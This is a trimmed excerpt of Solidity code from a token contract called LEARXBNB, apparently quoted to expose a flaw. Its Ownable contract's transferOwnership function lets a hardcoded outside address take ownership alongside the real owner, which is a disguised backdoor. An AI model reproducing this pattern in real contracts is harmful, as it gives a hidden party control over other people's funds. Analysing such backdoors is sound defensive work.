...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x28AE73064541187E4DBC31C20a46da08Ea358744));
...
contract LEARXBNB is Context, IERC20, Ownable, Pausable {
